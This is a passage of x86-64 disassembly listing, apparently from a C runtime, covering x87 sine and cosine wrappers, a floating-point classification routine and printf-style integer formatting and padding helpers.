  4054d6:	90                   	nop
  4054d7:	90                   	nop
  4054d8:	90                   	nop
  4054d9:	90                   	nop
  4054da:	90                   	nop
  4054db:	90                   	nop
  4054dc:	90                   	nop
  4054dd:	90                   	nop
  4054de:	90                   	nop
  4054df:	90                   	nop
  4054e0:	db 2a                	fldt   (%rdx)
  4054e2:	d9 fe                	fsin
  4054e4:	df e0                	fnstsw %ax
  4054e6:	a9 00 04 00 00       	test   $0x400,%eax
  4054eb:	75 0e                	jne    0x4054fb
  4054ed:	48 89 c8             	mov    %rcx,%rax
  4054f0:	48 c7 41 08 00 00 00 	movq   $0x0,0x8(%rcx)
  4054f7:	00 
  4054f8:	db 39                	fstpt  (%rcx)
  4054fa:	c3                   	ret
  4054fb:	d9 eb                	fldpi
  4054fd:	d8 c0                	fadd   %st(0),%st
  4054ff:	d9 c9                	fxch   %st(1)
  405501:	d9 f5                	fprem1
  405503:	df e0                	fnstsw %ax
  405505:	a9 00 04 00 00       	test   $0x400,%eax
  40550a:	75 f5                	jne    0x405501
  40550c:	dd d9                	fstp   %st(1)
  40550e:	d9 fe                	fsin
  405510:	48 89 c8             	mov    %rcx,%rax
  405513:	48 c7 41 08 00 00 00 	movq   $0x0,0x8(%rcx)
  40551a:	00 
  40551b:	db 39                	fstpt  (%rcx)
  40551d:	c3                   	ret
  40551e:	90                   	nop
  40551f:	90                   	nop
  405520:	db 2a                	fldt   (%rdx)
  405522:	d9 ff                	fcos
  405524:	df e0                	fnstsw %ax
  405526:	a9 00 04 00 00       	test   $0x400,%eax
  40552b:	74 15                	je     0x405542
  40552d:	d9 eb                	fldpi
  40552f:	d8 c0                	fadd   %st(0),%st
  405531:	d9 c9                	fxch   %st(1)
  405533:	d9 f5                	fprem1
  405535:	df e0                	fnstsw %ax
  405537:	a9 00 04 00 00       	test   $0x400,%eax
  40553c:	75 f5                	jne    0x405533
  40553e:	dd d9                	fstp   %st(1)
  405540:	d9 ff                	fcos
  405542:	48 89 c8             	mov    %rcx,%rax
  405545:	48 c7 41 08 00 00 00 	movq   $0x0,0x8(%rcx)
  40554c:	00 
  40554d:	db 39                	fstpt  (%rcx)
  40554f:	c3                   	ret
  405550:	48 83 ec 58          	sub    $0x58,%rsp
  405554:	49 89 d2             	mov    %rdx,%r10
  405557:	db 2a                	fldt   (%rdx)
  405559:	d9 e5                	fxam
  40555b:	9b df e0             	fstsw  %ax
  40555e:	dd d8                	fstp   %st(0)
  405560:	f6 c4 01             	test   $0x1,%ah
  405563:	74 1b                	je     0x405580
  405565:	f6 c4 04             	test   $0x4,%ah
  405568:	0f 84 82 00 00 00    	je     0x4055f0
  40556e:	0f b7 42 08          	movzwl 0x8(%rdx),%eax
  405572:	c7 44 24 44 03 00 00 	movl   $0x3,0x44(%rsp)
  405579:	00 
  40557a:	31 d2                	xor    %edx,%edx
  40557c:	eb 15                	jmp    0x405593
  40557e:	66 90                	xchg   %ax,%ax
  405580:	f6 c4 04             	test   $0x4,%ah
  405583:	75 4f                	jne    0x4055d4
  405585:	0f b7 42 08          	movzwl 0x8(%rdx),%eax
  405589:	c7 44 24 44 00 00 00 	movl   $0x0,0x44(%rsp)
  405590:	00 
  405591:	31 d2                	xor    %edx,%edx
  405593:	25 00 80 00 00       	and    $0x8000,%eax
  405598:	4c 8b 9c 24 80 00 00 	mov    0x80(%rsp),%r11
  40559f:	00 
  4055a0:	41 89 03             	mov    %eax,(%r11)
  4055a3:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
  4055a8:	4c 89 4c 24 30       	mov    %r9,0x30(%rsp)
  4055ad:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
  4055b1:	4c 8d 4c 24 44       	lea    0x44(%rsp),%r9
  4055b6:	48 8d 0d 53 39 0d 00 	lea    0xd3953(%rip),%rcx        # 0x4d8f10
  4055bd:	44 89 44 24 28       	mov    %r8d,0x28(%rsp)
  4055c2:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
  4055c7:	4d 89 d0             	mov    %r10,%r8
  4055ca:	e8 f1 1e 00 00       	call   0x4074c0
  4055cf:	48 83 c4 58          	add    $0x58,%rsp
  4055d3:	c3                   	ret
  4055d4:	f6 c4 40             	test   $0x40,%ah
  4055d7:	74 27                	je     0x405600
  4055d9:	0f b7 42 08          	movzwl 0x8(%rdx),%eax
  4055dd:	c7 44 24 44 02 00 00 	movl   $0x2,0x44(%rsp)
  4055e4:	00 
  4055e5:	ba c3 bf ff ff       	mov    $0xffffbfc3,%edx
  4055ea:	eb a7                	jmp    0x405593
  4055ec:	0f 1f 40 00          	nopl   0x0(%rax)
  4055f0:	c7 44 24 44 04 00 00 	movl   $0x4,0x44(%rsp)
  4055f7:	00 
  4055f8:	31 d2                	xor    %edx,%edx
  4055fa:	31 c0                	xor    %eax,%eax
  4055fc:	eb 9a                	jmp    0x405598
  4055fe:	66 90                	xchg   %ax,%ax
  405600:	0f b7 42 08          	movzwl 0x8(%rdx),%eax
  405604:	c7 44 24 44 01 00 00 	movl   $0x1,0x44(%rsp)
  40560b:	00 
  40560c:	89 c2                	mov    %eax,%edx
  40560e:	81 e2 ff 7f 00 00    	and    $0x7fff,%edx
  405614:	81 ea 3e 40 00 00    	sub    $0x403e,%edx
  40561a:	e9 74 ff ff ff       	jmp    0x405593
  40561f:	90                   	nop
  405620:	53                   	push   %rbx
  405621:	48 83 ec 20          	sub    $0x20,%rsp
  405625:	8b 42 08             	mov    0x8(%rdx),%eax
  405628:	48 89 d3             	mov    %rdx,%rbx
  40562b:	f6 c4 40             	test   $0x40,%ah
  40562e:	75 08                	jne    0x405638
  405630:	8b 52 24             	mov    0x24(%rdx),%edx
  405633:	39 53 28             	cmp    %edx,0x28(%rbx)
  405636:	7e 12                	jle    0x40564a
  405638:	f6 c4 20             	test   $0x20,%ah
  40563b:	75 23                	jne    0x405660
  40563d:	48 63 43 24          	movslq 0x24(%rbx),%rax
  405641:	48 8b 13             	mov    (%rbx),%rdx
  405644:	88 0c 02             	mov    %cl,(%rdx,%rax,1)
  405647:	8b 53 24             	mov    0x24(%rbx),%edx
  40564a:	83 c2 01             	add    $0x1,%edx
  40564d:	89 53 24             	mov    %edx,0x24(%rbx)
  405650:	48 83 c4 20          	add    $0x20,%rsp
  405654:	5b                   	pop    %rbx
  405655:	c3                   	ret
  405656:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40565d:	00 00 00 
  405660:	48 8b 13             	mov    (%rbx),%rdx
  405663:	e8 10 4a 00 00       	call   0x40a078
  405668:	8b 53 24             	mov    0x24(%rbx),%edx
  40566b:	83 c2 01             	add    $0x1,%edx
  40566e:	89 53 24             	mov    %edx,0x24(%rbx)
  405671:	48 83 c4 20          	add    $0x20,%rsp
  405675:	5b                   	pop    %rbx
  405676:	c3                   	ret
  405677:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40567e:	00 00 
  405680:	41 54                	push   %r12
  405682:	55                   	push   %rbp
  405683:	57                   	push   %rdi
  405684:	56                   	push   %rsi
  405685:	53                   	push   %rbx
  405686:	48 83 ec 40          	sub    $0x40,%rsp
  40568a:	4c 89 c3             	mov    %r8,%rbx
  40568d:	48 89 ce             	mov    %rcx,%rsi
  405690:	4c 8d 44 24 2c       	lea    0x2c(%rsp),%r8
  405695:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
  40569a:	89 d5                	mov    %edx,%ebp
  40569c:	31 d2                	xor    %edx,%edx
  40569e:	e8 6d 34 00 00       	call   0x408b10
  4056a3:	8b 43 10             	mov    0x10(%rbx),%eax
  4056a6:	85 c0                	test   %eax,%eax
  4056a8:	78 05                	js     0x4056af
  4056aa:	39 c5                	cmp    %eax,%ebp
  4056ac:	0f 4f e8             	cmovg  %eax,%ebp
  4056af:	8b 43 0c             	mov    0xc(%rbx),%eax
  4056b2:	39 c5                	cmp    %eax,%ebp
  4056b4:	7d 7f                	jge    0x405735
  4056b6:	29 e8                	sub    %ebp,%eax
  4056b8:	85 c0                	test   %eax,%eax
  4056ba:	89 43 0c             	mov    %eax,0xc(%rbx)
  4056bd:	7e 06                	jle    0x4056c5
  4056bf:	f6 43 09 04          	testb  $0x4,0x9(%rbx)
  4056c3:	74 7b                	je     0x405740
  4056c5:	85 ed                	test   %ebp,%ebp
  4056c7:	7e 54                	jle    0x40571d
  4056c9:	0f b7 16             	movzwl (%rsi),%edx
  4056cc:	4c 8d 44 24 2c       	lea    0x2c(%rsp),%r8
  4056d1:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
  4056d6:	48 83 c6 02          	add    $0x2,%rsi
  4056da:	e8 31 34 00 00       	call   0x408b10
  4056df:	85 c0                	test   %eax,%eax
  4056e1:	7e 3a                	jle    0x40571d
  4056e3:	8d 40 ff             	lea    -0x1(%rax),%eax
  4056e6:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
  4056eb:	4c 8d 64 04 31       	lea    0x31(%rsp,%rax,1),%r12
  4056f0:	0f be 0f             	movsbl (%rdi),%ecx
  4056f3:	48 89 da             	mov    %rbx,%rdx
  4056f6:	48 83 c7 01          	add    $0x1,%rdi
  4056fa:	e8 21 ff ff ff       	call   0x405620
  4056ff:	4c 39 e7             	cmp    %r12,%rdi
  405702:	75 ec                	jne    0x4056f0
  405704:	83 ed 01             	sub    $0x1,%ebp
  405707:	85 ed                	test   %ebp,%ebp
  405709:	7f be                	jg     0x4056c9
  40570b:	eb 10                	jmp    0x40571d
  40570d:	0f 1f 00             	nopl   (%rax)
  405710:	48 89 da             	mov    %rbx,%rdx
  405713:	b9 20 00 00 00       	mov    $0x20,%ecx
  405718:	e8 03 ff ff ff       	call   0x405620
  40571d:	8b 43 0c             	mov    0xc(%rbx),%eax
  405720:	8d 50 ff             	lea    -0x1(%rax),%edx
  405723:	85 c0                	test   %eax,%eax
  405725:	89 53 0c             	mov    %edx,0xc(%rbx)
  405728:	7f e6                	jg     0x405710
  40572a:	48 83 c4 40          	add    $0x40,%rsp
  40572e:	5b                   	pop    %rbx
  40572f:	5e                   	pop    %rsi
  405730:	5f                   	pop    %rdi
  405731:	5d                   	pop    %rbp
  405732:	41 5c                	pop    %r12
  405734:	c3                   	ret
  405735:	c7 43 0c ff ff ff ff 	movl   $0xffffffff,0xc(%rbx)
  40573c:	eb 87                	jmp    0x4056c5
  40573e:	66 90                	xchg   %ax,%ax
  405740:	83 e8 01             	sub    $0x1,%eax
  405743:	89 43 0c             	mov    %eax,0xc(%rbx)
  405746:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40574d:	00 00 00 
  405750:	b9 20 00 00 00       	mov    $0x20,%ecx
  405755:	48 89 da             	mov    %rbx,%rdx
  405758:	e8 c3 fe ff ff       	call   0x405620
  40575d:	8b 43 0c             	mov    0xc(%rbx),%eax
  405760:	8d 48 ff             	lea    -0x1(%rax),%ecx
  405763:	85 c0                	test   %eax,%eax
  405765:	89 4b 0c             	mov    %ecx,0xc(%rbx)
  405768:	75 e6                	jne    0x405750
  40576a:	e9 56 ff ff ff       	jmp    0x4056c5
  40576f:	90                   	nop
  405770:	55                   	push   %rbp
  405771:	57                   	push   %rdi
  405772:	56                   	push   %rsi
  405773:	53                   	push   %rbx
  405774:	48 83 ec 28          	sub    $0x28,%rsp
  405778:	41 8b 40 10          	mov    0x10(%r8),%eax
  40577c:	48 89 ce             	mov    %rcx,%rsi
  40577f:	89 d5                	mov    %edx,%ebp
  405781:	4c 89 c3             	mov    %r8,%rbx
  405784:	85 c0                	test   %eax,%eax
  405786:	78 05                	js     0x40578d
  405788:	39 c2                	cmp    %eax,%edx
  40578a:	0f 4f e8             	cmovg  %eax,%ebp
  40578d:	8b 43 0c             	mov    0xc(%rbx),%eax
  405790:	39 c5                	cmp    %eax,%ebp
  405792:	0f 8d 8c 00 00 00    	jge    0x405824
  405798:	29 e8                	sub    %ebp,%eax
  40579a:	85 c0                	test   %eax,%eax
  40579c:	89 43 0c             	mov    %eax,0xc(%rbx)
  40579f:	7e 29                	jle    0x4057ca
  4057a1:	f6 43 09 04          	testb  $0x4,0x9(%rbx)
  4057a5:	75 23                	jne    0x4057ca
  4057a7:	83 e8 01             	sub    $0x1,%eax
  4057aa:	89 43 0c             	mov    %eax,0xc(%rbx)
  4057ad:	0f 1f 00             	nopl   (%rax)
  4057b0:	b9 20 00 00 00       	mov    $0x20,%ecx
  4057b5:	48 89 da             	mov    %rbx,%rdx
  4057b8:	e8 63 fe ff ff       	call   0x405620
  4057bd:	8b 43 0c             	mov    0xc(%rbx),%eax
  4057c0:	8d 48 ff             	lea    -0x1(%rax),%ecx
  4057c3:	85 c0                	test   %eax,%eax
  4057c5:	89 4b 0c             	mov    %ecx,0xc(%rbx)
  4057c8:	75 e6                	jne    0x4057b0
  4057ca:	8d 45 ff             	lea    -0x1(%rbp),%eax
  4057cd:	85 ed                	test   %ebp,%ebp
  4057cf:	48 8d 7c 06 01       	lea    0x1(%rsi,%rax,1),%rdi
  4057d4:	74 38                	je     0x40580e
  4057d6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  4057dd:	00 00 00 
  4057e0:	0f be 0e             	movsbl (%rsi),%ecx
  4057e3:	48 89 da             	mov    %rbx,%rdx
  4057e6:	48 83 c6 01          	add    $0x1,%rsi
  4057ea:	e8 31 fe ff ff       	call   0x405620
  4057ef:	48 39 fe             	cmp    %rdi,%rsi
  4057f2:	75 ec                	jne    0x4057e0
  4057f4:	8b 43 0c             	mov    0xc(%rbx),%eax
  4057f7:	8d 50 ff             	lea    -0x1(%rax),%edx
  4057fa:	85 c0                	test   %eax,%eax
  4057fc:	89 53 0c             	mov    %edx,0xc(%rbx)
  4057ff:	7e 1a                	jle    0x40581b
  405801:	48 89 da             	mov    %rbx,%rdx
  405804:	b9 20 00 00 00       	mov    $0x20,%ecx
  405809:	e8 12 fe ff ff       	call   0x405620
  40580e:	8b 43 0c             	mov    0xc(%rbx),%eax
  405811:	8d 50 ff             	lea    -0x1(%rax),%edx
  405814:	85 c0                	test   %eax,%eax
  405816:	89 53 0c             	mov    %edx,0xc(%rbx)
  405819:	7f e6                	jg     0x405801
  40581b:	48 83 c4 28          	add    $0x28,%rsp
  40581f:	5b                   	pop    %rbx
  405820:	5e                   	pop    %rsi
  405821:	5f                   	pop    %rdi
  405822:	5d                   	pop    %rbp
  405823:	c3                   	ret
  405824:	c7 43 0c ff ff ff ff 	movl   $0xffffffff,0xc(%rbx)
  40582b:	eb 9d                	jmp    0x4057ca
  40582d:	0f 1f 00             	nopl   (%rax)
  405830:	48 83 ec 38          	sub    $0x38,%rsp
  405834:	85 c9                	test   %ecx,%ecx
  405836:	41 c7 40 10 ff ff ff 	movl   $0xffffffff,0x10(%r8)
  40583d:	ff 
  40583e:	74 44                	je     0x405884
  405840:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
  405845:	45 8b 58 08          	mov    0x8(%r8),%r11d
  405849:	c6 44 24 20 2d       	movb   $0x2d,0x20(%rsp)
  40584e:	4c 8d 51 01          	lea    0x1(%rcx),%r10
  405852:	41 83 e3 20          	and    $0x20,%r11d
  405856:	45 31 c9             	xor    %r9d,%r9d
  405859:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
  40585e:	83 e0 df             	and    $0xffffffdf,%eax
  405861:	44 09 d8             	or     %r11d,%eax
  405864:	43 88 04 0a          	mov    %al,(%r10,%r9,1)
  405868:	49 83 c1 01          	add    $0x1,%r9
  40586c:	49 83 f9 03          	cmp    $0x3,%r9
  405870:	75 e7                	jne    0x405859
  405872:	49 8d 52 03          	lea    0x3(%r10),%rdx
  405876:	48 29 ca             	sub    %rcx,%rdx
  405879:	e8 f2 fe ff ff       	call   0x405770
  40587e:	90                   	nop
  40587f:	48 83 c4 38          	add    $0x38,%rsp
  405883:	c3                   	ret
  405884:	45 8b 58 08          	mov    0x8(%r8),%r11d
  405888:	41 f7 c3 00 01 00 00 	test   $0x100,%r11d
  40588f:	74 10                	je     0x4058a1
  405891:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
  405896:	c6 44 24 20 2b       	movb   $0x2b,0x20(%rsp)
  40589b:	4c 8d 51 01          	lea    0x1(%rcx),%r10
  40589f:	eb b1                	jmp    0x405852
  4058a1:	41 f6 c3 40          	test   $0x40,%r11b
  4058a5:	74 19                	je     0x4058c0
  4058a7:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
  4058ac:	c6 44 24 20 20       	movb   $0x20,0x20(%rsp)
  4058b1:	4c 8d 51 01          	lea    0x1(%rcx),%r10
  4058b5:	eb 9b                	jmp    0x405852
  4058b7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  4058be:	00 00 
  4058c0:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
  4058c5:	49 89 ca             	mov    %rcx,%r10
  4058c8:	eb 88                	jmp    0x405852
  4058ca:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  4058d0:	55                   	push   %rbp
  4058d1:	48 89 e5             	mov    %rsp,%rbp
  4058d4:	57                   	push   %rdi
  4058d5:	56                   	push   %rsi
  4058d6:	53                   	push   %rbx
  4058d7:	48 83 ec 28          	sub    $0x28,%rsp
  4058db:	44 8b 42 10          	mov    0x10(%rdx),%r8d
  4058df:	44 8b 52 08          	mov    0x8(%rdx),%r10d
  4058e3:	31 c0                	xor    %eax,%eax
  4058e5:	48 89 d6             	mov    %rdx,%rsi
  4058e8:	49 89 cb             	mov    %rcx,%r11
  4058eb:	45 85 c0             	test   %r8d,%r8d
  4058ee:	41 0f 49 c0          	cmovns %r8d,%eax
  4058f2:	41 f7 c2 00 10 00 00 	test   $0x1000,%r10d
  4058f9:	44 8d 48 17          	lea    0x17(%rax),%r9d
  4058fd:	74 0b                	je     0x40590a
  4058ff:	66 83 7a 20 00       	cmpw   $0x0,0x20(%rdx)
  405904:	0f 85 e6 01 00 00    	jne    0x405af0
  40590a:	8b 46 0c             	mov    0xc(%rsi),%eax
  40590d:	41 39 c1             	cmp    %eax,%r9d
  405910:	41 0f 4d c1          	cmovge %r9d,%eax
  405914:	48 98                	cltq
  405916:	48 83 c0 0f          	add    $0xf,%rax
  40591a:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
  40591e:	e8 ed f8 ff ff       	call   0x405210
  405923:	48 29 c4             	sub    %rax,%rsp
  405926:	41 f6 c2 80          	test   $0x80,%r10b
  40592a:	48 8d 7c 24 20       	lea    0x20(%rsp),%rdi
  40592f:	74 11                	je     0x405942
  405931:	48 85 c9             	test   %rcx,%rcx
  405934:	0f 88 36 02 00 00    	js     0x405b70
  40593a:	41 80 e2 7f          	and    $0x7f,%r10b
  40593e:	44 89 56 08          	mov    %r10d,0x8(%rsi)
  405942:	4d 85 db             	test   %r11,%r11
  405945:	4c 89 d9             	mov    %r11,%rcx
  405948:	0f 84 49 02 00 00    	je     0x405b97
  40594e:	49 89 f8             	mov    %rdi,%r8
  405951:	49 b9 cd cc cc cc cc 	movabs $0xcccccccccccccccd,%r9
  405958:	cc cc cc 
  40595b:	eb 46                	jmp    0x4059a3
  40595d:	0f 1f 00             	nopl   (%rax)
  405960:	48 39 df             	cmp    %rbx,%rdi
  405963:	0f 84 5b 01 00 00    	je     0x405ac4
  405969:	f6 46 09 10          	testb  $0x10,0x9(%rsi)
  40596d:	74 31                	je     0x4059a0
  40596f:	66 83 7e 20 00       	cmpw   $0x0,0x20(%rsi)
  405974:	74 2a                	je     0x4059a0
  405976:	48 89 d8             	mov    %rbx,%rax
  405979:	48 29 f8             	sub    %rdi,%rax
  40597c:	48 89 c2             	mov    %rax,%rdx
  40597f:	48 c1 fa 3f          	sar    $0x3f,%rdx
  405983:	48 c1 ea 3e          	shr    $0x3e,%rdx
  405987:	48 01 d0             	add    %rdx,%rax
  40598a:	83 e0 03             	and    $0x3,%eax
  40598d:	48 29 d0             	sub    %rdx,%rax
  405990:	48 83 f8 03          	cmp    $0x3,%rax
  405994:	0f 84 36 01 00 00    	je     0x405ad0
  40599a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  4059a0:	49 89 d8             	mov    %rbx,%r8
  4059a3:	48 89 c8             	mov    %rcx,%rax
  4059a6:	49 8d 58 01          	lea    0x1(%r8),%rbx
  4059aa:	49 f7 e1             	mul    %r9
  4059ad:	48 c1 ea 03          	shr    $0x3,%rdx
  4059b1:	48 8d 04 92          	lea    (%rdx,%rdx,4),%rax
  4059b5:	48 01 c0             	add    %rax,%rax
  4059b8:	48 29 c1             	sub    %rax,%rcx
  4059bb:	83 c1 30             	add    $0x30,%ecx
  4059be:	48 85 d2             	test   %rdx,%rdx
  4059c1:	41 88 08             	mov    %cl,(%r8)
  4059c4:	48 89 d1             	mov    %rdx,%rcx
  4059c7:	75 97                	jne    0x405960
  4059c9:	44 8b 46 10          	mov    0x10(%rsi),%r8d
  4059cd:	45 85 c0             	test   %r8d,%r8d
  4059d0:	7e 2f                	jle    0x405a01
  4059d2:	48 89 f8             	mov    %rdi,%rax
  4059d5:	48 29 d8             	sub    %rbx,%rax
  4059d8:	41 01 c0             	add    %eax,%r8d
  4059db:	45 85 c0             	test   %r8d,%r8d
  4059de:	7e 21                	jle    0x405a01
  4059e0:	41 8d 48 ff          	lea    -0x1(%r8),%ecx
  4059e4:	48 89 d8             	mov    %rbx,%rax
  4059e7:	48 8d 54 0b 01       	lea    0x1(%rbx,%rcx,1),%rdx
  4059ec:	0f 1f 40 00          	nopl   0x0(%rax)
  4059f0:	c6 00 30             	movb   $0x30,(%rax)
  4059f3:	48 83 c0 01          	add    $0x1,%rax
  4059f7:	48 39 d0             	cmp    %rdx,%rax
  4059fa:	75 f4                	jne    0x4059f0
  4059fc:	48 8d 5c 0b 01       	lea    0x1(%rbx,%rcx,1),%rbx
  405a01:	48 39 fb             	cmp    %rdi,%rbx
  405a04:	0f 84 76 01 00 00    	je     0x405b80
  405a0a:	8b 46 0c             	mov    0xc(%rsi),%eax
  405a0d:	85 c0                	test   %eax,%eax
  405a0f:	7e 59                	jle    0x405a6a
  405a11:	48 89 fa             	mov    %rdi,%rdx
  405a14:	48 29 da             	sub    %rbx,%rdx
  405a17:	01 c2                	add    %eax,%edx
  405a19:	8b 46 08             	mov    0x8(%rsi),%eax
  405a1c:	85 d2                	test   %edx,%edx
  405a1e:	89 56 0c             	mov    %edx,0xc(%rsi)
  405a21:	7e 4a                	jle    0x405a6d
  405a23:	a9 c0 01 00 00       	test   $0x1c0,%eax
  405a28:	74 06                	je     0x405a30
  405a2a:	83 ea 01             	sub    $0x1,%edx
  405a2d:	89 56 0c             	mov    %edx,0xc(%rsi)
  405a30:	8b 56 10             	mov    0x10(%rsi),%edx
  405a33:	85 d2                	test   %edx,%edx
  405a35:	0f 88 e9 00 00 00    	js     0x405b24
  405a3b:	f6 c4 04             	test   $0x4,%ah
  405a3e:	75 2d                	jne    0x405a6d
  405a40:	8b 56 0c             	mov    0xc(%rsi),%edx
  405a43:	8d 4a ff             	lea    -0x1(%rdx),%ecx
  405a46:	85 d2                	test   %edx,%edx
  405a48:	89 4e 0c             	mov    %ecx,0xc(%rsi)
  405a4b:	7e 20                	jle    0x405a6d
  405a4d:	0f 1f 00             	nopl   (%rax)
  405a50:	48 89 f2             	mov    %rsi,%rdx
  405a53:	b9 20 00 00 00       	mov    $0x20,%ecx
  405a58:	e8 c3 fb ff ff       	call   0x405620
  405a5d:	8b 46 0c             	mov    0xc(%rsi),%eax
  405a60:	8d 50 ff             	lea    -0x1(%rax),%edx
  405a63:	85 c0                	test   %eax,%eax
  405a65:	89 56 0c             	mov    %edx,0xc(%rsi)
  405a68:	7f e6                	jg     0x405a50
  405a6a:	8b 46 08             	mov    0x8(%rsi),%eax
  405a6d:	a8 80                	test   $0x80,%al
  405a6f:	74 6f                	je     0x405ae0
  405a71:	c6 03 2d             	movb   $0x2d,(%rbx)
  405a74:	48 83 c3 01          	add    $0x1,%rbx
  405a78:	48 39 df             	cmp    %rbx,%rdi
  405a7b:	73 31                	jae    0x405aae
  405a7d:	0f 1f 00             	nopl   (%rax)
  405a80:	48 83 eb 01          	sub    $0x1,%rbx
  405a84:	48 89 f2             	mov    %rsi,%rdx
  405a87:	0f be 0b             	movsbl (%rbx),%ecx
  405a8a:	e8 91 fb ff ff       	call   0x405620
  405a8f:	48 39 fb             	cmp    %rdi,%rbx
  405a92:	75 ec                	jne    0x405a80
  405a94:	8b 46 0c             	mov    0xc(%rsi),%eax
  405a97:	8d 50 ff             	lea    -0x1(%rax),%edx
  405a9a:	85 c0                	test   %eax,%eax
  405a9c:	89 56 0c             	mov    %edx,0xc(%rsi)
  405a9f:	7e 1a                	jle    0x405abb
  405aa1:	48 89 f2             	mov    %rsi,%rdx
  405aa4:	b9 20 00 00 00       	mov    $0x20,%ecx
  405aa9:	e8 72 fb ff ff       	call   0x405620
  405aae:	8b 46 0c             	mov    0xc(%rsi),%eax
  405ab1:	8d 50 ff             	lea    -0x1(%rax),%edx
  405ab4:	85 c0                	test   %eax,%eax
  405ab6:	89 56 0c             	mov    %edx,0xc(%rsi)
  405ab9:	7f e6                	jg     0x405aa1
  405abb:	48 8d 65 e8          	lea    -0x18(%rbp),%rsp
  405abf:	5b                   	pop    %rbx
  405ac0:	5e                   	pop    %rsi
  405ac1:	5f                   	pop    %rdi
  405ac2:	5d                   	pop    %rbp
  405ac3:	c3                   	ret
  405ac4:	48 89 fb             	mov    %rdi,%rbx
  405ac7:	e9 d4 fe ff ff       	jmp    0x4059a0
  405acc:	0f 1f 40 00          	nopl   0x0(%rax)
  405ad0:	41 c6 40 01 2c       	movb   $0x2c,0x1(%r8)
  405ad5:	49 8d 58 02          	lea    0x2(%r8),%rbx
  405ad9:	e9 c2 fe ff ff       	jmp    0x4059a0
  405ade:	66 90                	xchg   %ax,%ax
  405ae0:	f6 c4 01             	test   $0x1,%ah
  405ae3:	74 2b                	je     0x405b10
  405ae5:	c6 03 2b             	movb   $0x2b,(%rbx)
  405ae8:	48 83 c3 01          	add    $0x1,%rbx
  405aec:	eb 8a                	jmp    0x405a78
  405aee:	66 90                	xchg   %ax,%ax
  405af0:	44 89 c8             	mov    %r9d,%eax
  405af3:	ba 56 55 55 55       	mov    $0x55555556,%edx
  405af8:	f7 ea                	imul   %edx
  405afa:	44 89 c8             	mov    %r9d,%eax
  405afd:	c1 f8 1f             	sar    $0x1f,%eax
  405b00:	29 c2                	sub    %eax,%edx
  405b02:	41 01 d1             	add    %edx,%r9d
  405b05:	e9 00 fe ff ff       	jmp    0x40590a
  405b0a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  405b10:	a8 40                	test   $0x40,%al
  405b12:	0f 84 60 ff ff ff    	je     0x405a78
  405b18:	c6 03 20             	movb   $0x20,(%rbx)
  405b1b:	48 83 c3 01          	add    $0x1,%rbx
  405b1f:	e9 54 ff ff ff       	jmp    0x405a78
  405b24:	89 c2                	mov    %eax,%edx
  405b26:	81 e2 00 06 00 00    	and    $0x600,%edx
  405b2c:	81 fa 00 02 00 00    	cmp    $0x200,%edx
  405b32:	0f 85 03 ff ff ff    	jne    0x405a3b
  405b38:	8b 56 0c             	mov    0xc(%rsi),%edx
  405b3b:	8d 4a ff             	lea    -0x1(%rdx),%ecx
  405b3e:	85 d2                	test   %edx,%edx
  405b40:	89 4e 0c             	mov    %ecx,0xc(%rsi)
  405b43:	0f 8e 24 ff ff ff    	jle    0x405a6d
  405b49:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  405b50:	c6 03 30             	movb   $0x30,(%rbx)
  405b53:	8b 46 0c             	mov    0xc(%rsi),%eax
  405b56:	48 83 c3 01          	add    $0x1,%rbx
  405b5a:	8d 50 ff             	lea    -0x1(%rax),%edx
  405b5d:	85 c0                	test   %eax,%eax
  405b5f:	89 56 0c             	mov    %edx,0xc(%rsi)
  405b62:	7f ec                	jg     0x405b50
  405b64:	e9 01 ff ff ff       	jmp    0x405a6a
  405b69:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  405b70:	49 89 cb             	mov    %rcx,%r11
  405b73:	49 f7 db             	neg    %r11
  405b76:	e9 c7 fd ff ff       	jmp    0x405942
  405b7b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  405b80:	8b 4e 10             	mov    0x10(%rsi),%ecx
  405b83:	85 c9                	test   %ecx,%ecx
  405b85:	0f 84 7f fe ff ff    	je     0x405a0a
  405b8b:	c6 03 30             	movb   $0x30,(%rbx)
  405b8e:	48 83 c3 01          	add    $0x1,%rbx
  405b92:	e9 73 fe ff ff       	jmp    0x405a0a
  405b97:	48 89 fb             	mov    %rdi,%rbx
  405b9a:	e9 2e fe ff ff       	jmp    0x4059cd
  405b9f:	90                   	nop
  405ba0:	55                   	push   %rbp
  405ba1:	48 89 e5             	mov    %rsp,%rbp
  405ba4:	41 56                	push   %r14
  405ba6:	41 55                	push   %r13
  405ba8:	41 54                	push   %r12
  405baa:	57                   	push   %rdi
  405bab:	56                   	push   %rsi
  405bac:	53                   	push   %rbx
  405bad:	48 83 ec 20          	sub    $0x20,%rsp
  405bb1:	b8 18 00 00 00       	mov    $0x18,%eax
  405bb6:	83 f9 6f             	cmp    $0x6f,%ecx
  405bb9:	4c 89 c7             	mov    %r8,%rdi
  405bbc:	45 8b 40 10          	mov    0x10(%r8),%r8d
  405bc0:	41 89 ca             	mov    %ecx,%r10d
  405bc3:	8b 77 08             	mov    0x8(%rdi),%esi
  405bc6:	0f 95 c1             	setne  %cl
  405bc9:	44 0f b6 e9          	movzbl %cl,%r13d
  405bcd:	48 89 d3             	mov    %rdx,%rbx
  405bd0:	49 89 d1             	mov    %rdx,%r9
